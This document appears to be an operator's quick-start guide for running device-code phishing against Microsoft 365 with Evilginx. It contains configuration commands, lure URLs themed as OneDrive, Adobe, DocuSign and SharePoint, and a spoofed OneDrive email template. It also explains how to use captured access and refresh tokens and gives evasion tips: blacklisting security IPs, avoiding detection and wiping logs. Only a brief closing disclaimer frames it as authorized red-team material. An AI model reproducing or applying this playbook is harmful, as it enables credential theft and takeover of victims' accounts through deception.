# Quick Start: Using Themed Document Access Pages

## Instant Setup (5 Minutes)

### Step 1: Configure Evilginx
```bash
# Start evilginx
./evilginx

# Set your domain
config domain your-phishing-domain.com

# Set your IP
config ip YOUR_SERVER_IP

# Enable a phishlet (e.g., Office 365)
phishlets hostname o365 login.your-phishing-domain.com
phishlets enable o365
```

### Step 2: Create Device Code Lure
```bash
# Create a lure with device code enabled
lures create o365 onedrive-doc

# Configure device code settings
lures edit 0 dc_mode always
lures edit 0 dc_client ms_onedrive
lures edit 0 dc_scope full

# Set redirect URL (where victim lands after auth)
lures edit 0 redirect_url https://onedrive.live.com

# Get the lure URL
lures
```

### Step 3: Get Session ID

When a victim clicks your lure, a session is created. Get the session ID:
```bash
sessions
```

Output example:
```
┌────┬─────────────┬────────────────────┬────────────┐
│ id │ phishlet    │ username           │ captured   │
├────┼─────────────┼────────────────────┼────────────┤
│ 1  │ o365        │ abc123xyz          │ waiting    │
└────┴─────────────┴────────────────────┴────────────┘
```

The session ID is `abc123xyz`

### Step 4: Use Themed URLs

Now you have **5 different URLs** you can use:

#### Standard Microsoft:
```
https://login.your-phishing-domain.com/dc/abc123xyz
```

#### OneDrive Theme:
```
https://login.your-phishing-domain.com/access/onedrive/abc123xyz
```

#### Authenticator Theme:
```
https://login.your-phishing-domain.com/access/authenticator/abc123xyz
```

#### Adobe Theme:
```
https://login.your-phishing-domain.com/access/adobe/abc123xyz
```

#### DocuSign Theme:
```
https://login.your-phishing-domain.com/access/docusign/abc123xyz
```

#### SharePoint Theme:
```
https://login.your-phishing-domain.com/access/sharepoint/abc123xyz
```

**All 6 URLs lead to the SAME session and capture the SAME tokens!**

---

## Campaign Example: OneDrive Document Share

### Email Template
```
From: notifications@onedrive.com [SPOOFED]
Subject: John Smith shared "Q4_Budget_Final.xlsx" with you

Hi there,

John Smith (john.smith@company.com) has shared a document with you on OneDrive.

Document: Q4_Budget_Final.xlsx
Shared: March 7, 2026 at 2:30 PM

[Access Document] → https://login.your-phishing-domain.com/access/onedrive/abc123xyz

This link will expire in 7 days.

Best regards,
The OneDrive Team
```

### What Happens:
1. ✅ Victim clicks "Access Document"
2. ✅ Sees OneDrive-branded verification page
3. ✅ Page says "Loading..." (generating device code)
4. ✅ Code appears: "ABCD-EFGH"
5. ✅ Victim clicks "Access Document" button
6. ✅ Popup opens: **microsoft.com/devicelogin** (REAL Microsoft!)
7. ✅ Victim enters code "ABCD-EFGH"
8. ✅ Microsoft asks for email/password (on REAL microsoft.com)
9. ✅ Victim authenticates
10. ✅ Your evilginx captures access_token + refresh_token
11. ✅ Victim's page shows "✓ Document Access Granted"
12. ✅ Auto-redirects to onedrive.live.com
13. ✅ Victim thinks they just accessed the document normally

---

## Advanced: Per-Campaign Theme Selection

You can create multiple lures with different themes for A/B testing:

```bash
# OneDrive campaign
lures create o365 campaign-onedrive
lures edit 0 dc_mode always
lures edit 0 dc_template onedrive

# Adobe campaign
lures create o365 campaign-adobe
lures edit 1 dc_mode always
lures edit 1 dc_template adobe

# DocuSign campaign  
lures create o365 campaign-docusign
lures edit 2 dc_mode always
lures edit 2 dc_template docusign
```

Then use the appropriate `/access/{theme}/{session_id}` URL for each campaign.

---

## Monitoring Sessions

Watch in real-time as tokens are captured:

```bash
# Watch all sessions
sessions

# Get captured tokens for a session
sessions 1

# Export tokens
sessions 1 export
```

---

## Token Usage

Once captured, use tokens immediately:

```bash
# Get the access token
sessions 1 export

# Use with Azure CLI (example)
az login --access-token YOUR_ACCESS_TOKEN

# Or use with Microsoft Graph API
curl -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  https://graph.microsoft.com/v1.0/me
```

---

## Operational Security Tips

### 1. Domain Selection
- ✅ Use legitimate-sounding domains: `secure-docs.com`, `verify-access.com`
- ✅ Purchase aged domains (better reputation)
- ✅ Use Let's Encrypt SSL (free, trusted)

### 2. Email Delivery
- ✅ Use email service with good reputation
- ✅ SPF/DKIM/DMARC configuration
- ✅ Warm up domain before mass sending
- ✅ Personalize emails (name, company)

### 3. Infrastructure
- ✅ Use VPS in target's country
- ✅ Cloudflare proxy (hides real IP)
- ✅ Rate limiting (avoid detection)
- ✅ Blacklist known security IPs

### 4. Cleanup
- ✅ Delete sessions after extraction: `sessions 1 delete`
- ✅ Disable phishlets when done: `phishlets disable o365`
- ✅ Clear logs: `rm -rf ~/.evilginx/logs/*`

---

## Troubleshooting

### Issue: "Session not found"
**Solution**: Session expired or invalid ID. Create new lure.

### Issue: Code not appearing
**Solution**: Check device code manager status. Ensure Microsoft endpoints are reachable.

### Issue: Redirect not working
**Solution**: Set `redirect_url` in lure settings.

### Issue: Tokens not captured
**Solution**: 
1. Check session status: `sessions`
2. Verify victim completed auth at microsoft.com
3. Check evilginx logs for errors

---

## Pro Tips

### 💡 Tip 1: Use URL Shorteners
```
Long:  https://login.your-phishing-domain.com/access/onedrive/abc123xyz
Short: https://bit.ly/3AbCdEf (redirects to long URL)
```

### 💡 Tip 2: Context Matters
Match the theme to the pretext:
- **OneDrive**: File sharing, collaboration
- **Adobe**: PDF contracts, forms
- **DocuSign**: Signatures, approvals
- **SharePoint**: Intranet, policies
- **Authenticator**: Security alerts, MFA

### 💡 Tip 3: Urgency & Authority
Add urgency to increase success rate:
- "Urgent: Contract expires in 24 hours"
- "Action Required: Verify your identity"
- "Important: CEO shared confidential document"

### 💡 Tip 4: Follow-up Emails
If victim doesn't click:
- Day 1: Initial email
- Day 3: "Reminder: Document awaiting your review"
- Day 5: "Final reminder: Document expires soon"

---

## Legal Disclaimer

**⚠️ AUTHORIZED USE ONLY**

These tools are for:
- ✅ Authorized red team engagements
- ✅ Security assessments with written permission
- ✅ Education and research in controlled environments

**NEVER**:
- ❌ Unauthorized access to systems
- ❌ Phishing without explicit authorization
- ❌ Credential harvesting for malicious purposes

Unauthorized use is illegal and prosecutable under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws in most countries

**Always obtain written authorization before conducting security assessments.**

---

**Happy (authorized) Hunting! 🎣**
